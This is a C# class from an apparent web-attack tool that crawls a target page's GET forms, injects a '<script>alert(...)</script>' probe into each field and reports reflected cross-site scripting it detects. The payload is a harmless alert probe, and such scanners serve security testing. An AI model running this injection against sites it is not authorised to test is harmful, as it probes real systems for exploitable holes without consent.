using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text.RegularExpressions;
using Hacking_Rest_SqlInjetor.Form;
using Hacking_Rest_SqlInjetor.WebClient;

namespace Hacking_Rest_SqlInjetor.ServiceHandlers.AttackHandlers
{
    internal class XssAttackGetMethodInputs : AbstractServiceHandler
    {
        public override void StartAttack(string targetUri, ICustomHttpClient client)
        {
            var openSite = client.Get(targetUri);
            var document = CustomHttpClient.GetHtmlDocument(openSite);
            var formsOfHtmlDocument = GetFormsOfHtmlDocument(document, targetUri);
            
            foreach(var form in formsOfHtmlDocument)
            {
                if (form.Method != "GET")
                {
                    continue;
                }
                
                var requests = InjectScriptIntoEveryField(form, targetUri);
                foreach(var request in requests)
                {
                    request.BuildRequest();
                    var performGetInjection = client.Get(request);
                    string injectionResponse = CustomHttpClient.GetResponseContent(performGetInjection);
                    
                    const string scriptRegex = @"<script>alert\('X(.*?)SS'\)</script>";
                    const RegexOptions options = RegexOptions.IgnoreCase | RegexOptions.Singleline;
                    var match = Regex.Match(injectionResponse, scriptRegex, options);

                    if (match.Success)
                    {
                        Console.WriteLine($"Possible XSS-Attack Vector found in InputField on {targetUri}: {match.Groups[1].Value}");
                    }
                }
            }
        }
        
        private static IEnumerable<HttpContext> InjectScriptIntoEveryField(IFormData form, string targetUri)
        {
            var returnList = new List<HttpContext>();
            foreach (var input in form.InputFields)
            {
                var context = new HttpContext(HttpMethod.Get, targetUri);
                foreach (var inputField in form.InputFields)
                {
                    context.AddField(inputField.Name, inputField.Value ?? "test");
                }
                context.AddField(input.Name, $"<script>alert('X{input.Name}SS')</script>");
                returnList.Add(context);
            }
            return returnList;                    
        }       
    }
}
